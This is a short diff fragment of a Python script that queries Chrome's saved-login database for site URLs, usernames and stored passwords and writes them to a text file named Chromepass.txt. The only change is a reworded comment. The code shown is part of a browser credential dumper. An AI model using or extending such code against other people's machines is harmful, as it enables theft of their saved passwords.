@@ -16,7 +16,7 @@ conn.execute("PRAGMA busy_timeout = 300000")   # Added PRAGMA busy_timneout to w
 cursor.execute('Select action_url, username_value, password_value FROM logins')
 fp = open(r"Chromepass.txt", "a+")
 
-# Now we write to the file
+# we write to the file
 fp.write("Chrome Saved Passwords\n")
 for result in cursor.fetchall():
 
